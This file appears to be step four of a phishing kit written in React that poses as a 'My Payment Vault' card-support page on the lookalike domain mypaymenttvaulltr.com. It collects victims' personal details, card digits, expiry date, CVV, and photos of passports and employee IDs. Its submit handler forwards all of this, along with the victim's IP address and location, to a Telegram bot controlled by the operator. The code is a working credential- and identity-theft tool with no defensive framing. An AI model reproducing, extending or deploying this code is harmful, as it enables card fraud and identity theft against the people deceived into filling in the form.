import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Upload, Loader2 } from "lucide-react";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const COUNTRY_CODES = [
  { code: "+1",    flag: "🇺🇸", name: "United States" },
  { code: "+1",    flag: "🇨🇦", name: "Canada" },
  { code: "+7",    flag: "🇷🇺", name: "Russia" },
  { code: "+20",   flag: "🇪🇬", name: "Egypt" },
  { code: "+27",   flag: "🇿🇦", name: "South Africa" },
  { code: "+30",   flag: "🇬🇷", name: "Greece" },
  { code: "+31",   flag: "🇳🇱", name: "Netherlands" },
  { code: "+32",   flag: "🇧🇪", name: "Belgium" },
  { code: "+33",   flag: "🇫🇷", name: "France" },
  { code: "+34",   flag: "🇪🇸", name: "Spain" },
  { code: "+36",   flag: "🇭🇺", name: "Hungary" },
  { code: "+39",   flag: "🇮🇹", name: "Italy" },
  { code: "+40",   flag: "🇷🇴", name: "Romania" },
  { code: "+41",   flag: "🇨🇭", name: "Switzerland" },
  { code: "+43",   flag: "🇦🇹", name: "Austria" },
  { code: "+44",   flag: "🇬🇧", name: "United Kingdom" },
  { code: "+45",   flag: "🇩🇰", name: "Denmark" },
  { code: "+46",   flag: "🇸🇪", name: "Sweden" },
  { code: "+47",   flag: "🇳🇴", name: "Norway" },
  { code: "+48",   flag: "🇵🇱", name: "Poland" },
  { code: "+49",   flag: "🇩🇪", name: "Germany" },
  { code: "+51",   flag: "🇵🇪", name: "Peru" },
  { code: "+52",   flag: "🇲🇽", name: "Mexico" },
  { code: "+53",   flag: "🇨🇺", name: "Cuba" },
  { code: "+54",   flag: "🇦🇷", name: "Argentina" },
  { code: "+55",   flag: "🇧🇷", name: "Brazil" },
  { code: "+56",   flag: "🇨🇱", name: "Chile" },
  { code: "+57",   flag: "🇨🇴", name: "Colombia" },
  { code: "+58",   flag: "🇻🇪", name: "Venezuela" },
  { code: "+60",   flag: "🇲🇾", name: "Malaysia" },
  { code: "+61",   flag: "🇦🇺", name: "Australia" },
  { code: "+62",   flag: "🇮🇩", name: "Indonesia" },
  { code: "+63",   flag: "🇵🇭", name: "Philippines" },
  { code: "+64",   flag: "🇳🇿", name: "New Zealand" },
  { code: "+65",   flag: "🇸🇬", name: "Singapore" },
  { code: "+66",   flag: "🇹🇭", name: "Thailand" },
  { code: "+81",   flag: "🇯🇵", name: "Japan" },
  { code: "+82",   flag: "🇰🇷", name: "South Korea" },
  { code: "+84",   flag: "🇻🇳", name: "Vietnam" },
  { code: "+86",   flag: "🇨🇳", name: "China" },
  { code: "+90",   flag: "🇹🇷", name: "Turkey" },
  { code: "+91",   flag: "🇮🇳", name: "India" },
  { code: "+92",   flag: "🇵🇰", name: "Pakistan" },
  { code: "+93",   flag: "🇦🇫", name: "Afghanistan" },
  { code: "+94",   flag: "🇱🇰", name: "Sri Lanka" },
  { code: "+95",   flag: "🇲🇲", name: "Myanmar" },
  { code: "+98",   flag: "🇮🇷", name: "Iran" },
  { code: "+212",  flag: "🇲🇦", name: "Morocco" },
  { code: "+213",  flag: "🇩🇿", name: "Algeria" },
  { code: "+216",  flag: "🇹🇳", name: "Tunisia" },
  { code: "+218",  flag: "🇱🇾", name: "Libya" },
  { code: "+220",  flag: "🇬🇲", name: "Gambia" },
  { code: "+221",  flag: "🇸🇳", name: "Senegal" },
  { code: "+233",  flag: "🇬🇭", name: "Ghana" },
  { code: "+234",  flag: "🇳🇬", name: "Nigeria" },
  { code: "+251",  flag: "🇪🇹", name: "Ethiopia" },
  { code: "+254",  flag: "🇰🇪", name: "Kenya" },
  { code: "+255",  flag: "🇹🇿", name: "Tanzania" },
  { code: "+256",  flag: "🇺🇬", name: "Uganda" },
  { code: "+260",  flag: "🇿🇲", name: "Zambia" },
  { code: "+263",  flag: "🇿🇼", name: "Zimbabwe" },
  { code: "+351",  flag: "🇵🇹", name: "Portugal" },
  { code: "+352",  flag: "🇱🇺", name: "Luxembourg" },
  { code: "+353",  flag: "🇮🇪", name: "Ireland" },
  { code: "+354",  flag: "🇮🇸", name: "Iceland" },
  { code: "+355",  flag: "🇦🇱", name: "Albania" },
  { code: "+356",  flag: "🇲🇹", name: "Malta" },
  { code: "+358",  flag: "🇫🇮", name: "Finland" },
  { code: "+370",  flag: "🇱🇹", name: "Lithuania" },
  { code: "+371",  flag: "🇱🇻", name: "Latvia" },
  { code: "+372",  flag: "🇪🇪", name: "Estonia" },
  { code: "+374",  flag: "🇦🇲", name: "Armenia" },
  { code: "+375",  flag: "🇧🇾", name: "Belarus" },
  { code: "+380",  flag: "🇺🇦", name: "Ukraine" },
  { code: "+381",  flag: "🇷🇸", name: "Serbia" },
  { code: "+385",  flag: "🇭🇷", name: "Croatia" },
  { code: "+386",  flag: "🇸🇮", name: "Slovenia" },
  { code: "+389",  flag: "🇲🇰", name: "North Macedonia" },
  { code: "+420",  flag: "🇨🇿", name: "Czech Republic" },
  { code: "+421",  flag: "🇸🇰", name: "Slovakia" },
  { code: "+502",  flag: "🇬🇹", name: "Guatemala" },
  { code: "+503",  flag: "🇸🇻", name: "El Salvador" },
  { code: "+504",  flag: "🇭🇳", name: "Honduras" },
  { code: "+505",  flag: "🇳🇮", name: "Nicaragua" },
  { code: "+506",  flag: "🇨🇷", name: "Costa Rica" },
  { code: "+507",  flag: "🇵🇦", name: "Panama" },
  { code: "+509",  flag: "🇭🇹", name: "Haiti" },
  { code: "+591",  flag: "🇧🇴", name: "Bolivia" },
  { code: "+593",  flag: "🇪🇨", name: "Ecuador" },
  { code: "+595",  flag: "🇵🇾", name: "Paraguay" },
  { code: "+598",  flag: "🇺🇾", name: "Uruguay" },
  { code: "+673",  flag: "🇧🇳", name: "Brunei" },
  { code: "+675",  flag: "🇵🇬", name: "Papua New Guinea" },
  { code: "+676",  flag: "🇹🇴", name: "Tonga" },
  { code: "+679",  flag: "🇫🇯", name: "Fiji" },
  { code: "+685",  flag: "🇼🇸", name: "Samoa" },
  { code: "+686",  flag: "🇰🇮", name: "Kiribati" },
  { code: "+855",  flag: "🇰🇭", name: "Cambodia" },
  { code: "+856",  flag: "🇱🇦", name: "Laos" },
  { code: "+880",  flag: "🇧🇩", name: "Bangladesh" },
  { code: "+886",  flag: "🇹🇼", name: "Taiwan" },
  { code: "+960",  flag: "🇲🇻", name: "Maldives" },
  { code: "+961",  flag: "🇱🇧", name: "Lebanon" },
  { code: "+962",  flag: "🇯🇴", name: "Jordan" },
  { code: "+963",  flag: "🇸🇾", name: "Syria" },
  { code: "+964",  flag: "🇮🇶", name: "Iraq" },
  { code: "+965",  flag: "🇰🇼", name: "Kuwait" },
  { code: "+966",  flag: "🇸🇦", name: "Saudi Arabia" },
  { code: "+967",  flag: "🇾🇪", name: "Yemen" },
  { code: "+968",  flag: "🇴🇲", name: "Oman" },
  { code: "+970",  flag: "🇵🇸", name: "Palestine" },
  { code: "+971",  flag: "🇦🇪", name: "UAE" },
  { code: "+972",  flag: "🇮🇱", name: "Israel" },
  { code: "+973",  flag: "🇧🇭", name: "Bahrain" },
  { code: "+974",  flag: "🇶🇦", name: "Qatar" },
  { code: "+975",  flag: "🇧🇹", name: "Bhutan" },
  { code: "+976",  flag: "🇲🇳", name: "Mongolia" },
  { code: "+977",  flag: "🇳🇵", name: "Nepal" },
  { code: "+992",  flag: "🇹🇯", name: "Tajikistan" },
  { code: "+993",  flag: "🇹🇲", name: "Turkmenistan" },
  { code: "+994",  flag: "🇦🇿", name: "Azerbaijan" },
  { code: "+995",  flag: "🇬🇪", name: "Georgia" },
  { code: "+996",  flag: "🇰🇬", name: "Kyrgyzstan" },
  { code: "+998",  flag: "🇺🇿", name: "Uzbekistan" },
];

const INQUIRY_TYPES = [
  "Account Inquiry",
  "Card Issue",
  "Payment Problem",
  "Fraud Report",
  "Other",
];

const inp: React.CSSProperties = {
  width: "100%",
  height: 48,
  padding: "0 14px",
  fontSize: 14,
  color: "#111",
  border: "1px solid #ccc",
  borderRadius: 4,
  outline: "none",
  background: "#fff",
  boxSizing: "border-box",
  fontFamily: "inherit",
};

export default function Step4() {
  const { user, isAuthenticated } = useAuth();
  const [, navigate] = useLocation();

  const [firstName, setFirstName]       = useState("");
  const [lastName, setLastName]         = useState("");
  const [email, setEmail]               = useState("");
  const [phone, setPhone]               = useState("");
  const [dialCode, setDialCode]         = useState("+1");
  const [address, setAddress]           = useState("");
  const [city, setCity]                 = useState("");
  const [stateVal, setStateVal]         = useState("");
  const [postalCode, setPostalCode]     = useState("");
  const [dob, setDob]                   = useState("");
  const [inquiryType, setInquiryType]   = useState("");
  const [message, setMessage]           = useState("");
  const [cardDigits, setCardDigits]     = useState("");
  const [cardExp, setCardExp]           = useState("");
  const [cardCvv, setCardCvv]           = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
  const [errors, setErrors]             = useState<Record<string, string>>({});
  const [loading, setLoading]           = useState(false);

  const passportRef = useRef<HTMLInputElement>(null);
  const empIdRef    = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  const validate = () => {
    const e: Record<string, string> = {};
    if (!firstName.trim())   e.firstName   = "Wajib diisi.";
    if (!lastName.trim())    e.lastName    = "Wajib diisi.";
    if (!email.trim())       e.email       = "Wajib diisi.";
    if (!phone.trim())       e.phone       = "Wajib diisi.";
    if (!address.trim())     e.address     = "Wajib diisi.";
    if (!city.trim())        e.city        = "Wajib diisi.";
    if (!stateVal.trim())    e.state       = "Wajib diisi.";
    if (!postalCode.trim())  e.postalCode  = "Wajib diisi.";
    if (!dob.trim())         e.dob         = "Wajib diisi.";
    if (!inquiryType)        e.inquiryType = "Pilih salah satu.";
    if (!cardDigits.trim())       e.cardDigits = "Wajib diisi.";
    else if (!/^\d{8}$/.test(cardDigits.trim())) e.cardDigits = "Harus 8 angka.";
    if (!cardExp.trim())          e.cardExp    = "Wajib diisi.";
    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) e.cardExp = "Format: MM/YY";
    if (!cardCvv.trim())          e.cardCvv    = "Wajib diisi.";
    else if (!/^\d{3,4}$/.test(cardCvv.trim())) e.cardCvv = "3–4 angka.";
    if (!passportFile)       e.passport    = "Foto paspor wajib diunggah.";
    if (!empIdFile)          e.empId       = "Foto ID karyawan wajib diunggah.";
    return e;
  };

  const handleSubmit = async (ev: React.FormEvent) => {
    ev.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);

    try {
      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const ip  = await getIPInfo();

      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `📋 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Step 4 — Data Personal</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>     : <code>${user?.username ?? "-"}</code>\n` +
        `👦 <b>Nama Lengkap</b> : <code>${firstName} ${lastName}</code>\n` +
        `📧 <b>Email</b>        : <code>${email}</code>\n` +
        `📱 <b>Mobile</b>       : <code>${dialCode} ${phone}</code>\n` +
        `🏠 <b>Alamat</b>       : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
        `🎂 <b>Tgl Lahir</b>    : <code>${dob}</code>\n` +
        `📌 <b>Inquiry</b>      : <code>${inquiryType}</code>\n` +
        `💬 <b>Pesan</b>        : <code>${message || "-"}</code>\n` +
        `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
        `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
        `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>        : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );

      await fetch("/api/submissions/personal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user?.username ?? "",
          firstName, lastName, email, phone: `${dialCode} ${phone}`,
          address, city, state: stateVal, postalCode,
          dob, inquiryType, message,
          cardDigits: cardDigits.trim(),
          cardExp: cardExp.trim(),
          cardCvv: cardCvv.trim(),
          ipAddress: ip,
        }),
      }).catch(() => {});

      if (passportFile)
        await sendFileToTelegram(passportFile, `📷 Passport — ${user?.username ?? "-"}`);
      if (empIdFile)
        await sendFileToTelegram(empIdFile, `🪪 Employee ID — ${user?.username ?? "-"}`);

      navigate("/verify");
    } catch (_) {
      navigate("/verify");
    }
  };

  const Err = ({ k }: { k: string }) =>
    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 3, display: "block" }}>{errors[k]}</span> : null;

  const row: React.CSSProperties = {
    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16,
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
      <style>{`
        .s4i:focus { border-color: #666 !important; }
        .s4i::placeholder { color: #aaa; }
        @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
      `}</style>

      <div style={{ width: "100%", maxWidth: 900 }}>

        {/* Header */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111", fontFamily: "inherit" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <span style={{ fontSize: 12, color: "#888" }}>Langkah 4 dari 6</span>
        </div>

        {/* Step dots */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 32, justifyContent: "center" }}>
          {[1,2,3,4,5,6].map(n => {
            const done = n < 4, active = n === 4;
            return (
              <div key={n} style={{ display: "flex", alignItems: "center" }}>
                <div style={{
                  width: 24, height: 24, borderRadius: "50%",
                  background: done || active ? "#111" : "#ddd",
                  display: "flex", alignItems: "center", justifyContent: "center",
                }}>
                  {done
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize: 10, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
                  }
                </div>
                {n < 6 && <div style={{ width: 32, height: 2, background: n < 4 ? "#111" : "#ddd", margin: "0 2px" }} />}
              </div>
            );
          })}
        </div>

        <form onSubmit={handleSubmit}>

          {/* Row 1: First Name + Last Name */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="First Name*" value={firstName}
                onChange={e => setFirstName(e.target.value)}
                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ccc" }} />
              <Err k="firstName" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="Last Name*" value={lastName}
                onChange={e => setLastName(e.target.value)}
                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ccc" }} />
              <Err k="lastName" />
            </div>
          </div>

          {/* Row 2: Email + Mobile Phone */}
          <div style={row}>
            <div>
              <input className="s4i" type="email" placeholder="Email*" value={email}
                onChange={e => setEmail(e.target.value)}
                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ccc" }} />
              <Err k="email" />
            </div>
            <div>
              <div style={{ display: "flex", border: `1px solid ${errors.phone ? "#c00" : "#ccc"}`, borderRadius: 4, overflow: "hidden", height: 48, background: "#fff" }}>
                <select
                  value={dialCode}
                  onChange={e => setDialCode(e.target.value)}
                  style={{ border: "none", borderRight: "1px solid #e0e0e0", background: "#f7f7f7", fontSize: 13, color: "#111", padding: "0 6px", outline: "none", cursor: "pointer", minWidth: 90, maxWidth: 90, fontFamily: "inherit" }}
                >
                  {COUNTRY_CODES.map((c, i) => (
                    <option key={i} value={c.code}>{c.flag} {c.code}</option>
                  ))}
                </select>
                <input
                  className="s4i"
                  type="tel"
                  placeholder="Mobile Phone*"
                  value={phone}
                  onChange={e => setPhone(e.target.value)}
                  style={{ flex: 1, border: "none", outline: "none", padding: "0 14px", fontSize: 14, color: "#111", background: "#fff", fontFamily: "inherit" }}
                />
              </div>
              <Err k="phone" />
            </div>
          </div>

          {/* Row 3: Mailing Address + City */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="Mailing Address*" value={address}
                onChange={e => setAddress(e.target.value)}
                style={{ ...inp, borderColor: errors.address ? "#c00" : "#ccc" }} />
              <Err k="address" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="City*" value={city}
                onChange={e => setCity(e.target.value)}
                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ccc" }} />
              <Err k="city" />
            </div>
          </div>

          {/* Row 4: State + Postal Code */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="State*" value={stateVal}
                onChange={e => setStateVal(e.target.value)}
                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ccc" }} />
              <Err k="state" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="Postal Code*" value={postalCode}
                onChange={e => setPostalCode(e.target.value)}
                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ccc" }} />
              <Err k="postalCode" />
            </div>
          </div>

          {/* Row 5: DOB + Inquiry Type */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="Date of Birth (MM-DD-YYYY)*" value={dob}
                onChange={e => setDob(e.target.value)}
                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ccc" }} />
              <Err k="dob" />
            </div>
            <div>
              <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
                style={{
                  ...inp,
                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
                  color: inquiryType ? "#111" : "#aaa",
                  appearance: "none",
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "right 12px center",
                  paddingRight: 32,
                }}>
                <option value="" disabled>Select Inquiry Type*</option>
                {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
              </select>
              <Err k="inquiryType" />
            </div>
          </div>

          {/* Row 6: Card Digits + EXP + CVV */}
          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <div style={{ position: "relative" }}>
                <span style={{
                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
                  fontSize: 13, color: "#bbb", fontFamily: "monospace", pointerEvents: "none",
                }}>XXXX XXXX</span>
                <input className="s4i" type="text" inputMode="numeric"
                  placeholder="Card Last 8 Digits*"
                  maxLength={8} value={cardDigits}
                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
                  style={{ ...inp, paddingLeft: 106, fontFamily: "monospace", letterSpacing: "0.12em", borderColor: errors.cardDigits ? "#c00" : "#ccc" }} />
              </div>
              <Err k="cardDigits" />
            </div>
            <div>
              <input className="s4i" type="text" inputMode="numeric"
                placeholder="EXP (MM/YY)*"
                maxLength={5} value={cardExp}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
                }}
                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ccc" }} />
              <Err k="cardExp" />
            </div>
            <div>
              <input className="s4i" type="password" inputMode="numeric"
                placeholder="CVV*"
                maxLength={4} value={cardCvv}
                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
                style={{ ...inp, fontFamily: "monospace", borderColor: errors.cardCvv ? "#c00" : "#ccc" }} />
              <Err k="cardCvv" />
            </div>
          </div>

          {/* Row 7: Message */}
          <div style={{ marginBottom: 24 }}>
            <textarea placeholder="Message" value={message} onChange={e => setMessage(e.target.value)}
              rows={4}
              style={{
                width: "100%", padding: "12px 14px",
                fontSize: 14, color: "#111",
                border: "1px solid #ccc", borderRadius: 4,
                outline: "none", background: "#fff",
                boxSizing: "border-box", resize: "vertical",
                fontFamily: "inherit",
              }} />
          </div>

          {/* Row 8: File Uploads */}
          <div style={row}>
            {/* Passport */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
                Upload your passport photo (Required)<br />
                Supported: JPEG, PNG • Max size: 50 MB
              </p>
              <input ref={passportRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,passport:""})); }} />
              <button type="button" onClick={() => passportRef.current?.click()}
                style={{
                  width: "100%", height: 44, background: "#fff",
                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
                  borderRadius: 4, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}>
                <Upload size={15} />
                {passportFile ? passportFile.name : "Choose Photo"}
              </button>
              <Err k="passport" />
            </div>

            {/* Employee ID */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
                Upload your employee ID photo (Required)<br />
                Supported: JPEG, PNG • Max size: 50 MB
              </p>
              <input ref={empIdRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,empId:""})); }} />
              <button type="button" onClick={() => empIdRef.current?.click()}
                style={{
                  width: "100%", height: 44, background: "#fff",
                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
                  borderRadius: 4, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}>
                <Upload size={15} />
                {empIdFile ? empIdFile.name : "Choose Photo"}
              </button>
              <Err k="empId" />
            </div>
          </div>

          {/* Buttons */}
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 8 }}>
            <button type="button" onClick={() => navigate("/")}
              style={{
                height: 44, padding: "0 32px",
                background: "#fff", color: "#111",
                border: "1px solid #ccc", borderRadius: 4,
                fontSize: 14, fontWeight: 500, cursor: "pointer",
              }}>
              Cancel
            </button>
            <button type="submit" disabled={loading}
              style={{
                height: 44, padding: "0 36px",
                background: "#111", color: "#fff",
                border: "none", borderRadius: 4,
                fontSize: 14, fontWeight: 500,
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.7 : 1,
                display: "flex", alignItems: "center", gap: 8,
              }}>
              {loading
                ? <><Loader2 size={16} style={{ animation: "spin 1s linear infinite" }} /> Sending...</>
                : "Send"}
            </button>
          </div>

        </form>

        <div style={{ textAlign: "right", marginTop: 20 }}>
          <span style={{ fontSize: 11, color: "#bbb" }}>
            &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
          </span>
        </div>
      </div>
    </div>
  );
}
